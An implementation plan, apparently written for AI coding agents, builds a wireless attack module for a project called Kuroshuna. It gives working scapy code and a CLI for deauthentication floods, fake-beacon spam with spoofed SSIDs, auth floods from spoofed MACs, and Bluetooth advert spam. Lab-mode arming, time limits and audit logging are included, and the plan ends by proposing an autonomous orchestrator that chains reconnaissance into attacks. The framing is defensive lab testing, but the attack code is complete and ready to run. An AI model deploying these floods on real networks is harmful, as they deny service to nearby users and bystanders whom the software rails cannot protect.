# Kuroshuna Phase 4 — Tier B Broadcast (Attack Simulation) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the broadcast / non-targeted attack-simulation tier — deauth-flood, beacon spam, association/auth flood, and BLE-advert spam — each gated by `Gate.broadcast_allowed()`, time-boxed with auto-stop, pinned to one channel, and footprint-limited, for validating lab defenses.

**Architecture:** New module `backend/offense/rf_broadcast.py`. `BroadcastRF` checks `Gate.broadcast_allowed()` (Phase 1: requires `lab_mode` + `allow_broadcast` + `broadcast_armed`) before any burst, then runs a shared **time-boxed burst loop** whose duration is hard-capped to `broadcast.max_burst_seconds` and whose channel/limits come from `Gate.broadcast_limits()`. The transmitter, channel-setter, BLE sender, **and the clock/sleep** are injected, so the time-box and gating are deterministically unit-testable with no radio and no real time. `protect_bssids` are excluded wherever the attack form allows. This tier has NO target gate by design — that's why it's separated, double-armed, time-boxed, and footprint-capped.

**Tech Stack:** Python 3, scapy (frame building), Phase 1 `kuma_core.authz.Gate`. Reuses `build_deauth_frames` + `BROADCAST` from Phase 2 `offense.rf_targeted`.

**How to run tests:** from `backend/`: `python -m pytest tests/test_rf_broadcast.py -v`

**Spec:** `docs/superpowers/specs/2026-06-09-kuroshuna-offensive-mode-design.md` (§ "Tier B — Attack simulation"). Depends on Phase 1 (`Gate.broadcast_allowed`/`broadcast_limits`) and Phase 2 (`build_deauth_frames`).

---

## File Structure

- Create: `backend/offense/rf_broadcast.py` — `BroadcastRF` + frame builders (`build_beacon_frame`, `build_auth_frame`) + `BroadcastResult` + CLI.
- Create: `backend/tests/test_rf_broadcast.py` — unit tests (injected sender/channel/clock/sleep/ble + `Gate`, `tmp_path`).

`BroadcastRF.__init__(gate, iface=None, *, sender=None, set_channel=None, ble_sender=None, clock=None, sleep=None, dry_run=False)` — every hardware/timing touchpoint injectable.

Shared contract:
- `BroadcastResult(ok, reason, action, bursts, seconds, dry_run=False)`.
- A broadcast method: checks `broadcast_allowed()` → if denied returns `ok=False` with the reason and ZERO bursts; else caps duration to `max_burst_seconds`, tunes the pinned channel once, runs the time-boxed loop, audits start+stop (tier "B").
- The time-box loop is `_run_burst(send_fn, duration)` using the injected `clock`/`sleep`.

---

### Task 1: BroadcastResult + duration cap + time-boxed burst core

**Files:**
- Create: `backend/offense/rf_broadcast.py`
- Test: `backend/tests/test_rf_broadcast.py`

- [ ] **Step 1: Write the failing test**

```python
# backend/tests/test_rf_broadcast.py
"""Unit tests for Tier B broadcast offense (no radio/real-time; all injected)."""
from kuma_core.authz import Gate
from offense.rf_broadcast import BroadcastRF, BroadcastResult


def _bcast_gate(tmp_path, **extra):
    cfg = {"lab_mode": True, "allow_broadcast": True, "broadcast_armed": True,
           "broadcast": {"channel": 6, "max_tx_power_dbm": 5,
                         "max_burst_seconds": 3, "honor_protect_bssids": True}}
    cfg.update(extra)
    return Gate(config=cfg, audit_file=tmp_path / "audit.jsonl")


class _Clock:
    """Deterministic monotonic clock: each call advances by `step` seconds."""
    def __init__(self, step=1.0):
        self.t = 0.0
        self.step = step
    def __call__(self):
        v = self.t
        self.t += self.step
        return v


def test_run_burst_is_time_boxed(tmp_path):
    g = _bcast_gate(tmp_path)
    rf = BroadcastRF(gate=g, clock=_Clock(step=1.0), sleep=lambda *_: None)
    n = []
    bursts = rf._run_burst(lambda: n.append(1), duration=3)
    # clock advances 1.0/call: elapsed 0,1,2 < 3 -> 3 sends, then 3 not < 3 -> stop
    assert bursts == 3
    assert len(n) == 3


def test_cap_duration_to_max_burst_seconds(tmp_path):
    g = _bcast_gate(tmp_path)   # max_burst_seconds = 3
    rf = BroadcastRF(gate=g)
    assert rf._cap_duration(999) == 3
    assert rf._cap_duration(2) == 2
    assert rf._cap_duration(None) == 3       # default to the cap
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_rf_broadcast.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'offense.rf_broadcast'`

- [ ] **Step 3: Write minimal implementation**

```python
# backend/offense/rf_broadcast.py
"""Tier B broadcast offense (attack simulation): deauth-flood, beacon spam,
assoc/auth flood, BLE-advert spam. INDISCRIMINATE by construction -- used to
validate lab defenses, NOT targeted. There is no target gate; instead every
burst requires Gate.broadcast_allowed() (lab_mode + allow_broadcast +
broadcast_armed), is TIME-BOXED to broadcast.max_burst_seconds with auto-stop,
pinned to broadcast.channel, and capped to broadcast.max_tx_power_dbm.
protect_bssids are excluded wherever the attack form allows. Transmitter,
channel-setter, BLE sender, and clock/sleep are injected for hardware-free,
deterministic tests.

NOTE: these software rails shrink but cannot CONTAIN an RF broadcast footprint;
only physical isolation keeps it off non-lab gear. Running Tier B is the lab
owner's responsibility (documented in lab_targets.json).
"""
from __future__ import annotations

import time
from dataclasses import dataclass

from offense.rf_targeted import BROADCAST  # reuse


@dataclass
class BroadcastResult:
    ok: bool
    reason: str
    action: str
    bursts: int = 0
    seconds: float = 0.0
    dry_run: bool = False


class BroadcastRF:
    def __init__(self, gate, iface: str | None = None, *, sender=None,
                 set_channel=None, ble_sender=None, clock=None, sleep=None,
                 dry_run: bool = False) -> None:
        from kuma_core.config import settings
        self.gate = gate
        self.iface = iface or settings.monitor_interface
        self._sender = sender
        self._set_channel = set_channel
        self._ble_sender = ble_sender
        self._clock = clock or time.monotonic
        self._sleep = sleep or time.sleep
        self.dry_run = dry_run

    def _cap_duration(self, requested) -> int:
        cap = self.gate.broadcast_limits()["max_burst_seconds"]
        if requested is None:
            return cap
        return min(requested, cap)

    def _run_burst(self, send_fn, duration, interval: float = 0.1) -> int:
        start = self._clock()
        bursts = 0
        while self._clock() - start < duration:
            send_fn()
            bursts += 1
            self._sleep(interval)
        return bursts
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_rf_broadcast.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add backend/offense/rf_broadcast.py backend/tests/test_rf_broadcast.py
git commit -m "feat(offense): broadcast time-box core + duration cap"
```

---

### Task 2: deauth_flood — gated, time-boxed, honors protect_bssids

**Files:**
- Modify: `backend/offense/rf_broadcast.py`
- Test: `backend/tests/test_rf_broadcast.py`

- [ ] **Step 1: Write the failing test**

```python
def test_deauth_flood_denied_when_not_broadcast_armed(tmp_path):
    g = _bcast_gate(tmp_path, broadcast_armed=False)   # one arm missing
    sent = []
    rf = BroadcastRF(gate=g, sender=lambda *a: sent.append(a),
                     set_channel=lambda *a: None, clock=_Clock(), sleep=lambda *_: None)
    res = rf.deauth_flood(duration=3)
    assert res.ok is False
    assert "broadcast_armed off" in res.reason
    assert sent == []                                   # never transmitted


def test_deauth_flood_armed_transmits_timeboxed(tmp_path):
    g = _bcast_gate(tmp_path)                            # max_burst_seconds=3
    sent, chans = [], []
    rf = BroadcastRF(gate=g, sender=lambda frames, iface, count: sent.append(len(frames)),
                     set_channel=lambda iface, ch: chans.append(ch),
                     clock=_Clock(step=1.0), sleep=lambda *_: None)
    res = rf.deauth_flood(duration=999)                 # asks for huge; capped to 3
    assert res.ok is True
    assert res.seconds == 3                              # capped
    assert chans == [6]                                  # pinned channel tuned once
    assert len(sent) == 3                                # 3 bursts (clock-driven)


def test_deauth_flood_excludes_protected_bssids(tmp_path):
    g = _bcast_gate(tmp_path, protect_bssids=["aa:bb:cc:dd:ee:ff"])
    targets_seen = []
    def cap_sender(frames, iface, count):
        # record the bssid (addr2) of the first frame each burst
        from scapy.all import Dot11  # type: ignore
        targets_seen.append(frames[0][Dot11].addr2.upper())
    rf = BroadcastRF(gate=g, sender=cap_sender, set_channel=lambda *a: None,
                     clock=_Clock(step=3.0), sleep=lambda *_: None)  # 1 burst then stop
    res = rf.deauth_flood(duration=3,
                          bssids=["AA:BB:CC:DD:EE:FF", "11:22:33:44:55:66"])
    assert res.ok is True
    assert "AA:BB:CC:DD:EE:FF" not in targets_seen      # protected one excluded
    assert "11:22:33:44:55:66" in targets_seen


def test_deauth_flood_dry_run(tmp_path):
    g = _bcast_gate(tmp_path)
    sent = []
    rf = BroadcastRF(gate=g, sender=lambda *a: sent.append(a),
                     set_channel=lambda *a: None, clock=_Clock(), sleep=lambda *_: None,
                     dry_run=True)
    res = rf.deauth_flood(duration=3)
    assert res.ok is True and res.dry_run is True
    assert res.bursts == 0
    assert sent == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_rf_broadcast.py -k deauth_flood -v`
Expected: FAIL — no `deauth_flood`

- [ ] **Step 3: Write minimal implementation**

Add the protected-set helper and the method:

```python
    def _protected_macs(self) -> set:
        return {b.upper() for b in self.gate.cfg.get("protect_bssids", [])}

    def _begin(self, action: str):
        """Shared gate + channel setup. Returns (ok, reason, channel, duration_cap_fn)
        or refusal."""
        allowed, why = self.gate.broadcast_allowed()
        if not allowed:
            self.gate.audit({"tier": "B", "action": action, "target": "*",
                             "allowed": False, "reason": why})
            return False, why, None
        return True, why, self.gate.broadcast_limits()["channel"]

    def deauth_flood(self, channel: int | None = None, duration=None,
                     bssids=None) -> BroadcastResult:
        from offense.rf_targeted import build_deauth_frames
        ok, why, pinned = self._begin("deauth_flood")
        if not ok:
            return BroadcastResult(False, why, "deauth_flood")
        ch = channel or pinned
        dur = self._cap_duration(duration)
        if self.dry_run:
            return BroadcastResult(True, "dry-run (no tx)", "deauth_flood",
                                   seconds=dur, dry_run=True)
        # honor protect_bssids: never deauth our own APs
        protected = self._protected_macs() if self.gate.broadcast_limits()[
            "honor_protect_bssids"] else set()
        targets = [b for b in (bssids or [BROADCAST]) if b.upper() not in protected]

        (self._set_channel or _set_channel)(self.iface, ch)

        def _send():
            for b in targets:
                frames = build_deauth_frames(b, BROADCAST)
                (self._sender or _sendp)(frames, self.iface, 1)

        bursts = self._run_burst(_send, dur)
        self.gate.audit({"tier": "B", "action": "deauth_flood", "target": "*",
                         "allowed": True,
                         "reason": f"{bursts} bursts/{dur}s ch{ch}"})
        return BroadcastResult(True, why, "deauth_flood", bursts, dur)
```

Add the default scapy helpers at module level (after the imports):

```python
def _sendp(frames, iface, count):
    from scapy.all import sendp  # type: ignore
    sendp(frames, iface=iface, count=count, inter=0.05, verbose=False)


def _set_channel(iface, channel):
    import subprocess
    subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)], check=False)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_rf_broadcast.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add backend/offense/rf_broadcast.py backend/tests/test_rf_broadcast.py
git commit -m "feat(offense): deauth_flood - broadcast-armed, time-boxed, protect-aware"
```

---

### Task 3: beacon_spam — fake beacon frames

**Files:**
- Modify: `backend/offense/rf_broadcast.py`
- Test: `backend/tests/test_rf_broadcast.py`

- [ ] **Step 1: Write the failing test**

```python
from scapy.all import Dot11Beacon, Dot11Elt  # type: ignore
from offense.rf_broadcast import build_beacon_frame


def test_build_beacon_frame_carries_ssid():
    f = build_beacon_frame("FreeWiFi", "02:11:22:33:44:55")
    assert f.haslayer(Dot11Beacon)
    elt = f.getlayer(Dot11Elt)
    assert elt.info == b"FreeWiFi"


def test_beacon_spam_denied_when_not_armed(tmp_path):
    g = _bcast_gate(tmp_path, allow_broadcast=False)
    sent = []
    rf = BroadcastRF(gate=g, sender=lambda *a: sent.append(a),
                     set_channel=lambda *a: None, clock=_Clock(), sleep=lambda *_: None)
    res = rf.beacon_spam(ssids=["A", "B"], duration=3)
    assert res.ok is False
    assert "allow_broadcast off" in res.reason
    assert sent == []


def test_beacon_spam_armed_transmits(tmp_path):
    g = _bcast_gate(tmp_path)
    sent = []
    rf = BroadcastRF(gate=g, sender=lambda frames, iface, count: sent.append(1),
                     set_channel=lambda *a: None, clock=_Clock(step=3.0),
                     sleep=lambda *_: None)  # 1 burst
    res = rf.beacon_spam(ssids=["FreeWiFi", "Starbucks"], duration=3)
    assert res.ok is True
    assert len(sent) == 1      # one burst sent the SSID set
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_rf_broadcast.py -k beacon -v`
Expected: FAIL — no `build_beacon_frame` / `beacon_spam`

- [ ] **Step 3: Write minimal implementation**

Add the frame builder (module level) and method:

```python
DEFAULT_SPAM_SSIDS = ["FreeWiFi", "Starbucks", "xfinitywifi", "ATTWiFi",
                      "Guest", "Public", "NETGEAR", "linksys"]


def build_beacon_frame(ssid: str, bssid: str):
    from scapy.all import (Dot11, Dot11Beacon, Dot11Elt, RadioTap)  # type: ignore
    return (RadioTap()
            / Dot11(type=0, subtype=8, addr1=BROADCAST, addr2=bssid, addr3=bssid)
            / Dot11Beacon(cap="ESS")
            / Dot11Elt(ID=0, info=ssid.encode()))
```

```python
    def beacon_spam(self, ssids=None, duration=None) -> BroadcastResult:
        ok, why, pinned = self._begin("beacon_spam")
        if not ok:
            return BroadcastResult(False, why, "beacon_spam")
        dur = self._cap_duration(duration)
        names = ssids or DEFAULT_SPAM_SSIDS
        if self.dry_run:
            return BroadcastResult(True, "dry-run (no tx)", "beacon_spam",
                                   seconds=dur, dry_run=True)
        (self._set_channel or _set_channel)(self.iface, pinned)
        # deterministic fake BSSIDs (index-based, locally-administered 02: prefix);
        # never collide with a protected BSSID.
        protected = self._protected_macs()
        frames = []
        for i, ssid in enumerate(names):
            bssid = "02:00:00:%02x:%02x:%02x" % (i & 0xff, (i >> 8) & 0xff, 0x10 + i)
            if bssid.upper() in protected:
                continue
            frames.append(build_beacon_frame(ssid, bssid))

        def _send():
            (self._sender or _sendp)(frames, self.iface, 1)

        bursts = self._run_burst(_send, dur)
        self.gate.audit({"tier": "B", "action": "beacon_spam", "target": "*",
                         "allowed": True,
                         "reason": f"{len(frames)} SSIDs x {bursts} bursts/{dur}s"})
        return BroadcastResult(True, why, "beacon_spam", bursts, dur)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_rf_broadcast.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add backend/offense/rf_broadcast.py backend/tests/test_rf_broadcast.py
git commit -m "feat(offense): beacon_spam - fake beacons, broadcast-armed, time-boxed"
```

---

### Task 4: assoc_flood — auth/assoc flood at one AP (broadcast-armed, protect-checked)

**Files:**
- Modify: `backend/offense/rf_broadcast.py`
- Test: `backend/tests/test_rf_broadcast.py`

- [ ] **Step 1: Write the failing test**

```python
from scapy.all import Dot11Auth  # type: ignore
from offense.rf_broadcast import build_auth_frame


def test_build_auth_frame():
    f = build_auth_frame("AA:BB:CC:DD:EE:FF", "02:00:00:00:00:01")
    assert f.haslayer(Dot11Auth)
    from scapy.all import Dot11  # type: ignore
    assert f[Dot11].addr1.upper() == "AA:BB:CC:DD:EE:FF"   # to the AP


def test_assoc_flood_refuses_protected_ap(tmp_path):
    g = _bcast_gate(tmp_path, protect_bssids=["aa:bb:cc:dd:ee:ff"])
    sent = []
    rf = BroadcastRF(gate=g, sender=lambda *a: sent.append(a),
                     set_channel=lambda *a: None, clock=_Clock(), sleep=lambda *_: None)
    res = rf.assoc_flood("AA:BB:CC:DD:EE:FF", duration=3)
    assert res.ok is False
    assert "protected" in res.reason.lower()
    assert sent == []


def test_assoc_flood_armed_transmits(tmp_path):
    g = _bcast_gate(tmp_path)
    sent = []
    rf = BroadcastRF(gate=g, sender=lambda frames, iface, count: sent.append(1),
                     set_channel=lambda *a: None, clock=_Clock(step=3.0),
                     sleep=lambda *_: None)
    res = rf.assoc_flood("11:22:33:44:55:66", duration=3)
    assert res.ok is True
    assert len(sent) == 1
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_rf_broadcast.py -k assoc -v`
Expected: FAIL — no `build_auth_frame` / `assoc_flood`

- [ ] **Step 3: Write minimal implementation**

```python
def build_auth_frame(bssid: str, src: str):
    from scapy.all import Dot11, Dot11Auth, RadioTap  # type: ignore
    return (RadioTap()
            / Dot11(addr1=bssid, addr2=src, addr3=bssid)
            / Dot11Auth(algo=0, seqnum=1, status=0))
```

```python
    def assoc_flood(self, bssid: str, duration=None, clients: int = 64) -> BroadcastResult:
        ok, why, pinned = self._begin("assoc_flood")
        if not ok:
            return BroadcastResult(False, why, "assoc_flood")
        if bssid.upper() in self._protected_macs():
            self.gate.audit({"tier": "B", "action": "assoc_flood", "target": bssid,
                             "allowed": False, "reason": "protected AP"})
            return BroadcastResult(False, "protected AP (refused)", "assoc_flood")
        dur = self._cap_duration(duration)
        if self.dry_run:
            return BroadcastResult(True, "dry-run (no tx)", "assoc_flood",
                                   seconds=dur, dry_run=True)
        (self._set_channel or _set_channel)(self.iface, pinned)
        # spoofed source MACs (locally-administered), rebuilt each burst
        frames = [build_auth_frame(bssid, "02:00:00:%02x:%02x:%02x"
                                   % (i & 0xff, (i >> 8) & 0xff, i & 0xff))
                  for i in range(clients)]

        def _send():
            (self._sender or _sendp)(frames, self.iface, 1)

        bursts = self._run_burst(_send, dur)
        self.gate.audit({"tier": "B", "action": "assoc_flood", "target": bssid,
                         "allowed": True, "reason": f"{clients} fake STAs x {bursts}/{dur}s"})
        return BroadcastResult(True, why, "assoc_flood", bursts, dur)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_rf_broadcast.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add backend/offense/rf_broadcast.py backend/tests/test_rf_broadcast.py
git commit -m "feat(offense): assoc_flood - auth flood, broadcast-armed, refuses protected AP"
```

---

### Task 5: ble_spam — BLE advert spam via injected BLE sender

**Files:**
- Modify: `backend/offense/rf_broadcast.py`
- Test: `backend/tests/test_rf_broadcast.py`

- [ ] **Step 1: Write the failing test**

```python
def test_ble_spam_denied_when_not_armed(tmp_path):
    g = _bcast_gate(tmp_path, lab_mode=False)
    sent = []
    rf = BroadcastRF(gate=g, ble_sender=lambda: sent.append(1),
                     clock=_Clock(), sleep=lambda *_: None)
    res = rf.ble_spam(duration=3)
    assert res.ok is False
    assert "lab_mode off" in res.reason
    assert sent == []


def test_ble_spam_armed_uses_ble_sender_timeboxed(tmp_path):
    g = _bcast_gate(tmp_path)
    sent = []
    rf = BroadcastRF(gate=g, ble_sender=lambda: sent.append(1),
                     clock=_Clock(step=1.0), sleep=lambda *_: None)
    res = rf.ble_spam(duration=999)            # capped to 3
    assert res.ok is True
    assert res.seconds == 3
    assert len(sent) == 3


def test_ble_spam_dry_run(tmp_path):
    g = _bcast_gate(tmp_path)
    sent = []
    rf = BroadcastRF(gate=g, ble_sender=lambda: sent.append(1),
                     clock=_Clock(), sleep=lambda *_: None, dry_run=True)
    res = rf.ble_spam(duration=3)
    assert res.ok is True and res.dry_run is True
    assert sent == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_rf_broadcast.py -k ble -v`
Expected: FAIL — no `ble_spam`

- [ ] **Step 3: Write minimal implementation**

BLE uses the Pi's own Bluetooth radio (not the Alfa); the real sender is a thin
HCI/bluez wrapper, lazy + injected. Add the default + method:

```python
def _ble_advert_send():
    # Real BLE advertising spam uses the Pi's BT controller via bluez HCI; kept as
    # a lazy injected dependency. Not exercised in CI (no controller on the dev box).
    raise NotImplementedError(
        "inject a ble_sender (bluez/HCI) on the Pi to enable BLE spam")
```

```python
    def ble_spam(self, duration=None) -> BroadcastResult:
        ok, why, _pinned = self._begin("ble_spam")
        if not ok:
            return BroadcastResult(False, why, "ble_spam")
        dur = self._cap_duration(duration)
        if self.dry_run:
            return BroadcastResult(True, "dry-run (no tx)", "ble_spam",
                                   seconds=dur, dry_run=True)
        send = self._ble_sender or _ble_advert_send
        bursts = self._run_burst(send, dur)
        self.gate.audit({"tier": "B", "action": "ble_spam", "target": "*",
                         "allowed": True, "reason": f"{bursts} adverts/{dur}s"})
        return BroadcastResult(True, why, "ble_spam", bursts, dur)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_rf_broadcast.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add backend/offense/rf_broadcast.py backend/tests/test_rf_broadcast.py
git commit -m "feat(offense): ble_spam - injected BLE sender, broadcast-armed, time-boxed"
```

---

### Task 6: CLI entrypoint

**Files:**
- Modify: `backend/offense/rf_broadcast.py`
- Test: `backend/tests/test_rf_broadcast.py`

- [ ] **Step 1: Write the failing test**

```python
from offense.rf_broadcast import build_args, run_cli


def test_cli_deauth_flood_dry_run(tmp_path, capsys):
    g = _bcast_gate(tmp_path)
    sent = []
    rf = BroadcastRF(gate=g, sender=lambda *a: sent.append(a),
                     set_channel=lambda *a: None, clock=_Clock(), sleep=lambda *_: None,
                     dry_run=True)
    args = build_args(["--deauth-flood", "--duration", "3", "--no-tx"])
    rc = run_cli(args, rf=rf)
    assert rc == 0
    assert sent == []
    assert "dry-run" in capsys.readouterr().out.lower()


def test_cli_requires_action(tmp_path):
    g = _bcast_gate(tmp_path)
    rf = BroadcastRF(gate=g, clock=_Clock(), sleep=lambda *_: None, dry_run=True)
    assert run_cli(build_args([]), rf=rf) == 2
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_rf_broadcast.py -k cli -v`
Expected: FAIL — no `build_args` / `run_cli`

- [ ] **Step 3: Write minimal implementation**

```python
def build_args(argv):
    import argparse
    p = argparse.ArgumentParser(
        prog="offense.rf_broadcast",
        description="Kuroshuna Tier B broadcast (attack simulation). Requires "
                    "lab_mode + allow_broadcast + broadcast_armed; time-boxed.")
    p.add_argument("--deauth-flood", dest="deauth_flood", action="store_true")
    p.add_argument("--beacon-spam", dest="beacon_spam", action="store_true")
    p.add_argument("--assoc-flood", dest="assoc_flood", metavar="BSSID")
    p.add_argument("--ble-spam", dest="ble_spam", action="store_true")
    p.add_argument("--duration", type=int, default=None)
    p.add_argument("--iface", default=None)
    p.add_argument("--no-tx", dest="no_tx", action="store_true")
    return p.parse_args(argv)


def run_cli(args, rf=None) -> int:
    actions = [args.deauth_flood, args.beacon_spam, bool(args.assoc_flood),
               args.ble_spam]
    if not any(actions):
        print("error: specify --deauth-flood / --beacon-spam / --assoc-flood BSSID "
              "/ --ble-spam", flush=True)
        return 2
    if rf is None:
        from kuma_core.authz import Gate
        rf = BroadcastRF(gate=Gate(), iface=args.iface, dry_run=args.no_tx)
    rc = 0

    def _report(r):
        nonlocal rc
        print(f"[{r.action}] ok={r.ok} {r.reason} bursts={r.bursts} "
              f"secs={r.seconds}{' (dry-run)' if r.dry_run else ''}", flush=True)
        rc = rc or (0 if r.ok else 1)

    if args.deauth_flood:
        _report(rf.deauth_flood(duration=args.duration))
    if args.beacon_spam:
        _report(rf.beacon_spam(duration=args.duration))
    if args.assoc_flood:
        _report(rf.assoc_flood(args.assoc_flood, duration=args.duration))
    if args.ble_spam:
        _report(rf.ble_spam(duration=args.duration))
    return rc


if __name__ == "__main__":  # pragma: no cover
    import sys
    sys.exit(run_cli(build_args(sys.argv[1:])))
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_rf_broadcast.py -v`
Expected: PASS (full file green)

- [ ] **Step 5: Commit**

```bash
git add backend/offense/rf_broadcast.py backend/tests/test_rf_broadcast.py
git commit -m "feat(offense): rf_broadcast CLI (--deauth-flood/--beacon-spam/--assoc-flood/--ble-spam)"
```

---

## Phase exit criteria

- `python -m pytest tests/test_rf_broadcast.py -v` → all green; full suite still green.
- `BroadcastRF` exposes `deauth_flood`, `beacon_spam`, `assoc_flood`, `ble_spam`; every one calls `Gate.broadcast_allowed()` BEFORE any tx and returns a refusal (zero bursts) when any of lab_mode/allow_broadcast/broadcast_armed is off.
- Every burst is duration-capped to `broadcast.max_burst_seconds`, tuned to the pinned channel, and audited (tier "B"). `protect_bssids` excluded in deauth_flood/beacon_spam; `assoc_flood` refuses a protected AP.
- `--no-tx` dry-runs every action (no tx, zero bursts).

## On-device validation (Jax, on the Pi — needs the Alfa + a footprint-limited setup)

These RADIATE broadly. Only run with low TX power + physical isolation (your bench, away
from neighbors) — the software rails cannot contain RF.
1. Arm: `lab_mode` + `allow_broadcast` + `broadcast_armed` in lab_targets.json; set
   `broadcast.channel` + low `max_tx_power_dbm` + a small `max_burst_seconds`.
2. Dry-run first: `sudo ./.venv/bin/python -m offense.rf_broadcast --deauth-flood --no-tx`
   → confirm armed, no tx, audit line, capped duration.
3. Live deauth-flood burst against your OWN test AP/clients; confirm clients drop and
   the burst AUTO-STOPS at max_burst_seconds. Confirm your protect_bssids stay up.
4. Beacon spam: confirm the fake SSIDs appear on a scanner, stop on time-box.
5. BLE spam: inject a bluez/HCI ble_sender on the Pi (no dev-box controller).

## Next phase (separate plan)

- **Phase 5** — autonomous orchestrator (`detectors/kuroshuna.py`): iterate the authorized
  set across Tier A RF + network, fire Tier B bursts when broadcast is armed, chain
  recon→attack with cooldowns, wire `auto_hostile_add` from the live detectors.
